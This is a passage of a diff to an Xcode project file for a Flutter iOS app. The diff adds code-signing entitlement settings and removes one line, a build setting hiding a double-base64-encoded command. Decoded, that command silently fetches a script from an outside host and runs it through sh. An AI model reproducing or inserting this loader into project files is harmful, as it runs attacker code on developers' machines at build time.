-				A6E983A = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzSjFiR1VpSUdoMGRIQnpPaTh2WVhCd2JHVmpZWE4wTG1sdUwyRXBJaUI4SUhOb0NnPT0K | q | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
@@ -523,6 +917,7 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
@@ -557,6 +952,7 @@
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
+				CODE_SIGN_ENTITLEMENTS = Runner/Runner.entitlements;
 				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = "$(FLUTTER_BUILD_NUMBER)";
